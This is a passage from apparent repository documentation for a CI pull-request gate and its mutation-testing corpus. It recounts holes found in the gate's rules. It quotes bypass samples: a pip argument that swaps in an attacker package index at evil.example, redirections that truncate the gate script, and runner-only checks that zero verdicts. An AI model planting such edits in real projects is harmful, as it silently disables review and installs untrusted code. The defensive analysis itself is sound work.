That last one also produced the wave's method finding, which is the kill-attribution lesson (stated in
full under "**The kill-attribution corollary**", below — the reference used to point at a paragraph
about a different lesson entirely) recurring for a third time. A probe rewriting a check's argv to `python -c pass`
*was* killed while `-c` and `pass` were still whitelisted — by the orphan-suite rule, which noticed the
suite the new argv stopped naming. The sweep reported a kill; the whitelist went on admitting a no-op
check. Six of this wave's eight probes died to a neighbouring rule rather than the one written for them,
five of those legitimately (the tail rule feeds `executes`, which feeds job identification, so the
message that surfaces names the outermost rule). The one that was not legitimate is now asserted
directly, as a control that names the whitelist instead of inferring it from a sweep.

**The twenty-third wave found the most severe hole of the whole run, and it was not in a rule — it was
in the assumption that reading the workflow tells you what CI does.** Every pip rule in this file
inspects the text `python -m pip install ${reqs}` and pins each word of it. But `${reqs}` is the
*stdout of `pr_gate.py`*, interpolated unquoted under `set -f` precisely so that it word-splits, so
every token the generator prints becomes its own word in pip's argv. One token added to a dict in the
generator:

```python
CO_REQUIRES = {"cumulusci": ["--index-url=https://evil.example/simple", "setuptools>=75.4,<77"]}
PINS = {"cumulusci": "cumulusci==4.8.1 --extra-index-url https://evil.example/simple"}
```

and CI installs from an arbitrary index before any check runs, with the workflow text untouched and the
suite reporting 503/503. This is the same hole the wave before it closed on the YAML side, reached
through the generator instead — so the general form is worth stating plainly: **pinning the consumer of
a generated value proves nothing about the value.** The payload is now read where it is produced, and
every token it emits must be a bare requirement specifier.

Two more of the wave's findings were invisible for a reason that no amount of care inside a rule would
have fixed: **every rule in this file runs on a laptop, and a predicate keyed on the runner does not.**

```python
if code and os.environ.get("RUNNER_OS"): code = 0   # Actions always sets it: every verdict zeroed
if os.environ.get("GITHUB_ACTIONS"): return []      # CI selects nothing, prints "All … passed"
```

Both pass locally and both defeat CI completely, and no fixture can catch them, because the fixture is
the laptop. Enumerating the runner's variables is the losing game, so the property asserted instead is
that the gate reads *no* environment variable at all — a decision it never makes cannot be made
differently in the two places. Two limits are worth stating rather than implying: the rule covers the
gate's own source, not the checks it spawns, which are subprocesses that inherit the environment (one of
them reads `FOUNDATIONS_REPO_ROOT` deliberately); and reading the environment is only one way to ask
"am I in CI", which is why a later wave had to add `sys.argv` and absolute-path literals to the same
property. It is the first rule here aimed at the suite's own blind spot rather than at the code.

The wave's other four were narrower versions of things this file already knew. A tree-exclusion filter
can key on a suffix, a basename or a dot-prefix, and the fixture written a wave earlier committed one
file per top-level *tree* — twelve of twenty-three trigger roots, dropping every dot-directory, so
`not f.startswith(".github/")` stopped a workflow edit from selecting the checks that guard the
workflow. It now commits one file per *trigger*, using the trigger's own path so that a filter keyed on
a basename cannot tell the probe from the real thing. The `DIFF_ARGV` pin was a substring match whose
own comment named the threat it could not see ("the danger is an *added* argument"): concatenating
`+ ["--", ":(exclude).github"]` leaves the pinned text verbatim, so the argv is now read structurally
and must be a single list literal. And a check's failure could be printed and then dropped from the
accounting by naming it — `if check["name"] != "pr_gate_suite": failures.append(...)` prints `[FAIL]`
and exits 0, which makes every guard in this file unenforceable at once.

**The twenty-fourth wave's worst finding was one character of lookbehind.** The rule that keeps a step
from writing into the checkout extracted a redirection's target with `(?<![0-9<>])>>?\s*(…)` — a
*negative* lookbehind, so a digit before the `>` discarded the whole match and no target was read at
all. `echo x 2> scripts/ai/pr_gate.py` in the installer step passed every one of the suite's 370
workflow assertions and truncates the script the next step runs, which then exits 0 having checked
nothing; `1>`, `2>>` and `>&` did the same. Every row of the rule's own refusal table used a plain `>`,
which is how it survived every wave from the one that introduced it to the twenty-fourth — the earlier
figure here counted from the wrong end — and the fix is to *consume* the descriptor rather than
exclude it. This one also lent its authority elsewhere: a second rule justified limiting its own subject
set with "`redirections()` already refuses every other target", so an under-reading rule quietly
weakened the rule that cited it. **A rule that cites another rule inherits its blind spot.**

Four more were the reachability rules being asked at one spelling. The decidedness apparatus — the
machinery that tells `if [ -z "${BASE_REF:-}" ]; then` (a real test) from `if true; then` (not one) — was
reached only when the terminator sat on the *opener's own line*, because the caller filtered to lines at
the step's base indentation and a block body is indented deeper. Multi-line is the spelling the real
workflow uses everywhere, so rewriting the resolver's test to `if true; then` ended that step before
`git rev-parse` verified anything, with the suite green. A `case` opens a block and carries no test at
all, so `case true in *) exit 0;; esac` read as guarded twice over — once for the opener, once because
the arm's pattern label `*)` sits where the command goes, so the terminator behind it was never seen.
And the exemption for a terminator *after* an invocation was handed one segment at a time, stripped of
the operator that decides whether that segment runs — which is the only thing the predicate swapped in
two waves earlier could see that its predecessor could not — so `true || python …check_branch_scope.py
"$@"; exit 0` disarmed it with an invocation bash never runs.

Two were the same class of asymmetry this file keeps producing, now on its sixth and seventh instances:
one reader normalises a spelling and the comparison beside it does not. `permitted_job` recognised two
pip spellings where `runs_pip` recognised seven, so `pip install ${reqs}` — a perfectly ordinary
respelling — was refused as a *foreign command*, diagnosing the wrong problem; the two are now one
reader with a `strict` flag, because the detecting caller must see `sudo pip` while the authorising one
must never accept it. And the argv whitelist admitted `python3` while the gate substituted
`sys.executable` for `python` only, so a check spelled that way would run under a different interpreter
from the one its `deps` and `min_python` were verified against. Both halves are closed at once, which is
the point: fixing one and leaving the other is how the asymmetry got here.

Five were controls that passed without exercising the rule they named — including one that had been
diagnosed and fixed *one screen away* and not swept: four pin-table controls compared a literal to a
literal, and `inputs_of` has a masking branch, so adding `"ref": None` to the table the failure message
tells you to edit makes the rule accept the redirection it exists to stop while the control still
passes. The gate-step key control claimed a kill that belonged to the value rule beside it (the
kill-attribution lesson, fourth instance), and the `shell: bash` control was a literal tautology —
`all(v == "bash" for v in {"shell": "bash"}.values())` — which passed with its rule deleted, inverted,
or narrowed to no steps.

One listed "correct edit" turned out to be wrong, which is worth as much as a hole. `| tee gate.log`
is refused, and should be: `tee` is a write channel with a command's spelling, so `| tee
scripts/ai/pr_gate.py` rewrites the script the job runs. Refusing it is the redirection ban applied to
its command form. When the suite rejects an edit, the question is which of the two is wrong, and here it
was the edit — it moved to the probe corpus, where it belongs.

**The twenty-fifth wave's three holes were all the same shape: a whitelist that stopped short of the
values it was written to control.** The `set` reader whitelisted the single-letter flags — the paragraph
explaining why names `-n` (noexec) and `-t` (onecmd) as the two that defuse a step outright — and then
collected `-o`'s *values* and asked only whether `pipefail` was among them. So `set -euo pipefail -o
noexec` kept every required letter, turned on the exact option the letter whitelist exists to refuse,
and passed: the step prints nothing and exits 0, so the gate never runs. `-o onecmd` is the same hole
one word over. The long spelling walked straight through the door the short spelling was bolted shut on,
which is what a vocabulary with two answers always does. The control table had a row for this — `set -eu
-o noclobber` — and it passed for the wrong reason, because `pipefail` was absent from that row and the
`-o` value was never read at all: **a fifth misattributed kill, and this one was hiding a live hole.**
Folding the long names onto their letters closed it and also fixed the mirror-image false rejection,
`set -o errexit -o nounset -o pipefail`, which turns on exactly what is required and was refused under
the message this rule's own docstring calls the worst one to get wrong.

The second is the first rule here that could not be written as a vocabulary rule at all. Bash exempts a
failing left-hand side of an `&&` list from `set -e`, so the list returns non-zero *without* aborting and
the step's status becomes whatever runs next:

```
false && echo hi                 → exit 1   # as the step's last command: the failure is the verdict
false && echo hi   ; echo x      → exit 0   # one line earlier: a failing gate, reported green
```

The same text is correct in one position and catastrophic in the other, and the second needs no `exit`
and no second operator — so refusing terminators on the `&&` branch, which is what the tail rule already
did, does not touch it. The property is *lastness*, which is a step-level fact, and it is now asserted
for every step. It also had to stay permissive: `gate && echo "::notice::gate green"` is a shape a
maintainer plausibly writes and this file already blesses it as a correct edit, so refusing `&&` outright
would have traded a hole for a false rejection.

The third was both readers of nesting agreeing and both being wrong. A block that opens *and closes* on
one line — `if [ -n "${HOME}" ]; then :; fi; exit 0` — put the terminator after the `fi`, at top level,
reachable, and unconditional; the walk pushed an opener no dedent then popped, and `terminates()` refused
to read the line for a second reason (it saw an opener). Two independent readers, one blind spot, which
is why neither the nesting probes nor the reachability probes found it. The repair had to be narrower
than the first attempt: reading the *whole* line once the closer was accounted for called four genuinely
guarded exits unconditional, because `if C; then exit 0; fi` and `if C; then :; fi; exit 0` differ only
in which side of the closer the terminator falls on. The closer is the boundary, and the rule now reads
only what follows it.

Two of this wave's other findings are worth recording for method rather than for content. One assertion
had been proving something different on every machine: the per-check verdict loop stubbed the runner but
not dependency detection, so on an interpreter missing pytest, PyYAML, textual or cumulusci, six of the
fourteen checks were asserted through the MISSING-DEP path while the message named the run path — and
*which* six varied with the machine, so a maintainer's local green proved strictly less than CI's. And
the crash class appeared for a fourth time in five waves: a check dict missing `gating`, `deps`,
`triggers` or `name` raised a `KeyError` about a hundred lines *above* the rule written to report a
missing trigger. The shape is now reported and then backfilled with inert defaults, so the reader gets
one finding naming the check and the key instead of a traceback, and every assertion after it still runs.
Reporting a defect and then tripping over the same data is worse than either alone.

The sixth misattributed kill came from this wave's own probe. The one-line-block mutation, applied to the
gate step, died on "every other command is a bare echo" — a neighbouring vocabulary rule — while the
reachability hole it was written for stayed open. Respelled into the branch-scope step, whose vocabulary
already admits `if`, `[`, `:`, `fi` and `exit`, it is killed by the rule under test and names it.
**Six instances now: a kill is evidence of nothing until you read which rule did the killing.**

**Two findings from an earlier wave were false rejections rather than holes, and they matter as much.**
The argv pins stripped only the glued, fd-less redirection, so `> /dev/null`, `2>/dev/null` and
`>/dev/null 2>&1` — three correct respellings of a redirection the rule already permits — all failed
it, the last because the tokenizer read the `&` of `2>&1` as a separator and invented a segment `1`. A
rule that fires on correct code is how rules get deleted rather than fixed, so the redirection tail is
now normalised and four spellings are asserted to pass.

The twenty-fifth wave is the only one whose subject was not the workflow, and it is the largest single
finding in the set: **eleven edits to `pr_gate.py` itself that leave the suite green and disable CI.**
Twenty-two waves of probes had mutated `pr-checks.yml`, because that is where the early holes were, and
the gate script was guarded instead by *source scans* — "no check is named inside `run()`", "the gate
reads no environment variable". A scan is a whitelist of spellings, so each one was a function or a
spelling away from being silent: a filter one function past the one the fixture reaches
(`selects(c, [f for f in files if not f.startswith(".github/")])`), a suffix filter inside
`changed_files()` that hides every dataset edit, `from os import environ` instead of `os.environ`,
`os.path.basename(sys.argv[0]) != "pr_gate.py"` — a CI detector that reads no variable at all, because
the workflow runs this file by path and every fixture imports it — and an exemption moved from the
booking loop to `main()`'s return, where the region the scan read stopped one statement short.

Three of the eleven were already dead, killed by the per-check behavioural rule from the wave before,
which is the shape of the answer: what closed the other eight was not a longer whitelist of spellings but
behaviour. Selection is now asserted per trigger *and* per extension through `main()` itself, so a filter
anywhere between the changed-file list and the selected list shows up as a check that was skipped;
`changed_files()` is exercised over one real committed file per extension; the resolver's whole argv is
compared, not its last word; and the payload is checked under both selectors. Two survivors admit no
behavioural refutation at all — `os.path.isdir("/opt/hostedtoolcache")` is true on a runner and false
everywhere else, so no local observation contradicts it. For those the answer is a smaller surface rather
than a cleverer rule: the three regions that decide a verdict are fingerprinted, and any edit to them
fails until a reader re-approves it, on the same reasoning as `EXPECTED`. The general lesson is the one
the sweep corpus was built on and had never been applied here: a rule about an artifact needs a mutation
of that artifact to have any evidence behind it, and for twenty-two waves the artifact under test was the
wrong one.

Two of the hundred and seventy-eight were caught by the mutation sweep, a hundred and sixty-four by review —
the last forty-five of those by local persona passes rather than hosted ones — and twelve by adversarially sweeping a new rule *before*
shipping it. The split inside "by review" is the useful
number: eleven rounds of hosted review preceded a **local** review pass, and the local pass immediately
found the one live false green in the set. Sweeping your own new rule catches respellings of the hole
you just closed; a reader with the diff in hand asks which *other* words in the whitelist do what the
closed one did. Both are cheap, only one of them was being run, and the local pass now runs before the
push rather than after it. Every earlier round was
found by review, each time *after* a sweep reported every mutation killed. A sweep only mutates in the shapes
its author already imagined, and here the blind spot moved rather than closed each time: comments,
then echoes, then masking, then the step and trigger levels the rules never read at all, then
the two shapes a whitelist of *permitted commands* still cannot see — a permitted command whose
status the shell throws away (`&`), and a value that crosses a step boundary through `$GITHUB_ENV`
rather than appearing in the step being read — and finally the gap between a whitelist and the text
it was matched against — and then, once the parse landed, the difference between a command whose
status escapes and a command bash reaches at all: `true || python …checker.py` is a real invocation,
the `code=$?` after it captures a real status, and the status is 0 because the command never ran —
and then, once *that* rule landed, the scope it was asked at, since a shell that has already exited
skips a command no condition guards.
The durable lesson is not any one of those shapes; it
is that "all mutations killed" is evidence about the sweep, and a guard is only as good as the
narrowest question it asks.

**The kill-attribution corollary**, which has now recurred four times and is the thing to read if you
read only one sentence here: *a mutation can die for a reason unrelated to the property it probes, so
attribution for a kill must be checked rather than assumed.* Instances: five controls whose fixtures
spliced onto the real gate step, so renaming that step made them assert nothing; a probe killed because
naming `scripts/ai/pr_gate.py` in another step tripped "exactly one step runs the gate", while the
property itself sailed through when respelled to name nothing; a `python -c pass` probe killed by the
orphan-suite rule while the whitelist went on admitting a no-op check; and a control table asserting
that the gate-step *key* rule rejects `shell: "cat {0}"` when the refusal actually came from the value
rule beside it. Prefer synthetic fixtures, and prefer mutations that do not name the artifact. Round 5 also retired a claim this file used to make — that the job "may
not be conditional" — because two mutations disproved it at the time: documentation asserting a
property the code does not have is worse than silence, since it is what the next reviewer trusts
instead of re-deriving. That claim is true again, by a different mechanism: `JOB_KEYS` whitelists the
job's keys, so an `if:` on the job fails wherever it is placed, before or after `steps:`. The
withdrawal outlived its reason — the same defect one turn further on, and the reason this paragraph
now names the rule that makes the claim true instead of asserting the claim.
**The twenty-sixth wave found the other half of a fix this file had already described.** `run()`
normalises a signal-killed child from a negative code to `2`, and the comment there called that "the
definition of a tool error in this file's 0/1/2 contract" — which the module docstring backs with "a tool
error is never read as a verdict". Both were true about `run()` and neither was true about the gate:
`main()`'s booking loop sent `1` and `2` down one branch, appended the check to `failures`, and returned
`1`. An OOM-killed suite was therefore published as a code verdict on a check that never reached one,
which is the single conflation the exit contract exists to prevent. Two source-level rules asserted the
normalisation and the deliberate timeout choice beside it, and neither could see this, because the defect
was in the *consumer* of the value rather than its producer — the same shape as the name-keyed exemption
two waves earlier, and the reason the new rule drives `main()` and reads its return code instead of
reading the source. A tool error now exits `2`, before `failures` is consulted (a run with both has not
reached a verdict, so `1` would overstate it) and is reported in its own sentence. The advisory checks
are the deliberate exception: an advisory check exists so that nothing it reports can block a merge, so
its broken environment must not become the one exit code that does — it is booked, printed and named
without changing the exit. Two things carry forward. The `MISSING-DEP` and timeout paths still exit `1`
and are *not* instances of this class: both are documented decisions with reasons in place, and a
dependency the workflow itself installs is a repo-controlled failure rather than an absent verdict.
And the region fingerprint did its job here for the first time — it failed on the booking-loop edit and
forced this paragraph, which is what "changes only by updating `VERDICT_REGIONS` deliberately" was for.

The corpus is kept for that reason — 147 mutations, 106 loosening probes, 47
correct-edit assertions and 17 gate-script probes across six files — but **not in
this repository**: it lives at `.agents/artifacts/sweeps/`, which `.gitignore` excludes, because this
project keeps agent working output out of the public tree and because these files mutate the very
workflow CI runs. So that figure is a local result, reproducible from any checkout that carries the
corpus and not from a fresh clone; promoting the corpus to a tracked harness under `tests/` is an open
question rather than an oversight. ("Any checkout" is a round-24 repair: four of the five harnesses
hardcoded one machine's absolute repo root, so the sentence above was false even for a second checkout
on that machine — the same durability defect as the virtualenv path below, and found the same way.) Keeping it only helps if it still runs, and all three of the mutation files named a virtualenv under
`/tmp` that the OS had since reaped, so the corpus was unrunnable at the exact moment a later round
needed it. They now default to the interpreter running them (`SWEEP_PY` overrides).

How a sweep runs turned out to matter as much as what it mutates. Two of the five files mutate the
tracked workflow in place — the first restoring from a copy held in memory in a `finally`, the second
with `git checkout`; the other three build a throwaway worktree — and mutating in place produced two confident
wrong answers: one reported 21/25 with two anchors "missing" against a workflow one line off HEAD
(25/25 once restored), and a suite run in another terminal failed on `SEL="--base HEAD"` — a mutation
from this corpus, caught mid-flight, in a shell that had touched nothing. Any concurrent reader sees a
mutated tree, so results are noise in both directions. The two that mutate in place now refuse to run
on a modified tree or a failing baseline — which is the guard that matters when the tree is shared. The
other three do not need it, because they mutate a throwaway `git worktree` and copy in only the files
under test, so a sweep can no longer be seen by anything but itself and can run against work in
progress. Two of those three go further and *subtract* a baseline rather than requiring it to be clean;
the third (round 5) still requires a clean baseline and exits if it does not get one, which is the
right call for a corpus whose mutations target `pr_gate.py` itself. Porting the remaining two in-place
harnesses to the worktree runner is the last open item there.

One corollary is worth stating separately, because it makes a passing suite actively misleading:
**never condition a guard on the token it guards.** The exit-propagation rule was written
`if "while" in shell:`, so deleting the retry loop deleted its own check. Nothing failed except the
total-count invariant — and that invariant's message says "update EXPECTED deliberately", which is
precisely what someone would do next. The rule is now unconditional. Any assertion of the form
"if the feature is present, check the feature" has the same defect and should be read as absent.
The first round of mutations found two live holes in these tests,
both in the gap between a helper returning the right value and the gate acting on it. The
nesting guard is the one property confirmed by hang rather than by failure, for the reason
given above.

Building it turned up six real defects rather than only proving the wiring. Making
`skill_manifest.py --check` gating exposed that it could not pass in CI at all: it demanded a
path inside the gitignored private artifacts tree, so it failed on every fresh clone while
passing on the workstation that held the clone (fixed above, in that script's own section). A
stale `--api-version 67.0` assertion in `tests/txn_data_harness/test_cli.py` had survived the 264
bump because nothing ran that suite. Three suites bound an exception class from CumulusCI
while the module under test bound its own fallback shim, so on a partially importable
CumulusCI the `except` clause missed and the suite failed with a confusing traceback instead
of a clear environment error; they now bind the class from the module under test. The root
`tui-cci` launcher was read and executed by a test that no check selected, so nothing ran it on
a launcher change. Two validators — the SFDMU dataset checker and the plan-README checker — could
be changed without the check that executes them being selected, so a semantic regression in
either would have merged unexercised. And the gate's own unclaimed-suite check caught its own new
suite.

**Used by:** `AGENTS.md` §"Pre-merge checklists". The workflow that runs it on every PR is
`.github/workflows/pr-checks.yml`, added by `#264-58`; `Mechanical checks` is a **required** status
check on `main`, `264` and `release/*` (repository settings, applied separately from the workflow).

---

## Dependencies

- **Python 3.10+** for these scripts (the schema-diff and skill-manifest
  scripts use PEP 604 union types like `list[Path] | None`). The previous
  "3.8+" claim predated the schema-diff tooling. 3.10 is the floor for *this
  directory*, not for the gate: the highest floor in `pr_gate.py`'s own matrix
  is **3.11** (a check run below its floor reports `MISSING-DEP`, which fails
  the gate), and CI pins `python-version: "3.13"` and exercises only that one
  version — so nothing is tested on 3.10.
- **PyYAML** — required by `generate_cci_reference.py` (a YAML generator) and
  used to enrich `skill_manifest.py` and `analyze_agent_tooling.py`
  (available in the CCI venv). `skill_manifest.py` and
  `analyze_agent_tooling.py` degrade to a stdlib-only fallback when it is
  absent; `analyze_agent_tooling.py check` never needs it.
- No other external dependencies

---

## Related

- `AGENTS.md` — Canonical AI agent instructions (repo root)
- `.cursor/skills/` — Per-topic skill guides (plain markdown, any agent)
- `.cursor/rules/` — File-specific auto-injection rules (Cursor only)
